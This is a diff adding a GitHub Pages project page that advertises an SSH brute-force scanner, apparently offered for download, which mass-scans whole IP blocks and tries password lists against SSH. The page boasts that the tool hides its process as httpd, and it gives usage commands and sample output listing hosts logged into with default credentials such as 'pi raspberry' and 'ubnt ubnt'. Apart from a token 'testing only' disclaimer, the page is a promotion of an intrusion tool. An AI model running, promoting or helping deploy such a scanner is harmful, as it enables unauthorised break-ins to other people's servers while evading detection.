@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="UTF-8">
+    <title>SSH-Brute-Force-Scanner by bssh2</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="stylesheets/normalize.css" media="screen">
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
+    <link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">
+  </head>
+  <body>
+    <section class="page-header">
+      <h1 class="project-name">SSH-Brute-Force-Scanner</h1>
+      <h2 class="project-tagline">ssh brute force , ssh scanner , ssh bruteforce, ssh tool , bruteforce tool , brute scanner , brute</h2>
+      <a href="https://github.com/bssh2/SSH-Brute-Force-Scanner" class="btn">View on GitHub</a>
+      <a href="https://github.com/bssh2/SSH-Brute-Force-Scanner/zipball/master" class="btn">Download .zip</a>
+      <a href="https://github.com/bssh2/SSH-Brute-Force-Scanner/tarball/master" class="btn">Download .tar.gz</a>
+    </section>
+
+    <section class="main-content">
+      <h1>
+<a id="ssh2-bruteforce-v23--2015" class="anchor" href="#ssh2-bruteforce-v23--2015" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a><a href="https://github.com/SSH2" class="user-mention">@SSH2</a> Bruteforce v2.3 @ 2015!</h1>
+
+<p>BSSHv2.3 is a great tool for scanning ssh2 connections by providing a list of IPs and passwords. It is fast, reliable and easy to use. It is written in C++, therefore it is compatible on a large scale of unix systems, both 32 and 64 bits.</p>
+
+<p>Compatible on 32 and 64 bit sistem on a various systems
+Fast and reliable
+Easy to use
+Using fork() hidden process (will appear as /usr/sbin/httpd instead of bssh2 in <code>ps aux</code> command)
+Making differance between linux sistems and NON-BASH systems
+The script will run and eventually catch two type of ssh2 connections :</p>
+
+<p>NOBASH (nobash.txt) -&gt; systems that can’t support basic and common SSH2 commands, but can still be used as a sshtunnel (some of them)
+LINUX (vuln.txt) -&gt; systems that can support basic and common SSH2 commands</p>
+
+<p>Before the scan start you must provide 2 files :
+scan.log (ips line by line)</p>
+
+<ul>
+<li>1.2.3.4</li>
+<li>4.4.4.4</li>
+<li>5.5.5.5</li>
+</ul>
+
+<p>pass.txt</p>
+
+<ul>
+<li>user1 pass1</li>
+<li>user2 pass2</li>
+<li>anotheruser anotherpass</li>
+</ul>
+
+<p>ATTENTION:
+Scan from uid0 servers:</p>
+
+<ul>
+<li>./scan_root 62</li>
+<li>scanning network 62.<em>.</em>.*</li>
+<li>usec: 100, burst packets 50</li>
+<li>using "(tcp[tcpflags]=0x12) and (src port 22) and (dst port 46222)" as pcap filter</li>
+<li>my detected ip on eth0 is 1<em>7.</em><em>.2</em>*.3</li>
+<li>capturing process started pid 27055</li>
+<li>scanning 62.0.0.*</li>
+<li>scanning 62.0.1.*</li>
+<li>.......</li>
+<li>
+<a href="https://github.com/SSH2" class="user-mention">@SSH2</a> Bruteforce v2.3 @ 2015!</li>
+<li>-&gt; by <a href="mailto:lan.tester@yahoo.com">lan.tester@yahoo.com</a>
+</li>
+<li>-&gt; E-mail us for support or if you want to make a donation !</li>
+<li>Login successful!</li>
+<li>Vipcode is OK</li>
+<li>nobash -&gt; aaron aaron 62.<em>.</em>.* 22</li>
+<li>nobash -&gt; account account 62.<em>.</em>.* 22</li>
+<li>nobash -&gt; account account 62.<em>.</em>.* 22</li>
+</ul>
+
+<p>Scan from normal user (not uid0):
+1. SCAN A CLASS</p>
+
+<ul>
+<li> ./mass 88</li>
+<li>[*] MASS scan for USERs</li>
+<li>scanning: 88.0.255.* (total: 1575) (100.0% done)</li>
+<li>pscan completed in 299 seconds. (found 1577 ips)</li>
+<li>
+<a href="https://github.com/SSH2" class="user-mention">@SSH2</a> Bruteforce v2.3 @ 2015!</li>
+<li>-&gt; by <a href="mailto:lan.tester@yahoo.com">lan.tester@yahoo.com</a>
+</li>
+<li>-&gt; E-mail us for support or if you want to make a donation !</li>
+<li>Login successful!</li>
+<li>Vipcode is OK</li>
+<li>nobash -&gt; pi raspberry 88.0.<em>.</em> 22</li>
+</ul>
+
+<p>SCAN B CLASS # the small one</p>
+
+<ul>
+<li> ./scan_user A_CLASS.B_CLASS</li>
+</ul>
+
+<p>EXAMPLE:</p>
+
+<ul>
+<li>./scan_user 81.2</li>
+<li>scanning: 81.2.255.* (total: 520) (100.0% done)</li>
+<li>pscan completed in 285 seconds. (found 3520 ips)</li>
+<li>
+<a href="https://github.com/SSH2" class="user-mention">@SSH2</a> Bruteforce v2.3 @ 2015!</li>
+<li>-&gt; by <a href="mailto:lan.tester@yahoo.com">lan.tester@yahoo.com</a>
+</li>
+<li>-&gt; E-mail us for support or if you want to make a donation !</li>
+<li>Login successful!</li>
+<li>Vipcode is OK</li>
+<li>nobash -&gt; ubnt ubnt 81.2.<em>.</em> 22</li>
+</ul>
+
+<p>Download SSH2 Bruteforce v2.3 @ 2015</p>
+
+<p>This software is intended for testing only. Please use it at your own risk!</p>
+
+      <footer class="site-footer">
+        <span class="site-footer-owner"><a href="https://github.com/bssh2/SSH-Brute-Force-Scanner">SSH-Brute-Force-Scanner</a> is maintained by <a href="https://github.com/bssh2">bssh2</a>.</span>
+
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the <a href="https://github.com/jasonlong/cayman-theme">Cayman theme</a> by <a href="https://twitter.com/jasonlong">Jason Long</a>.</span>
+      </footer>
+
+    </section>
+
+  
+  </body>
+</html>
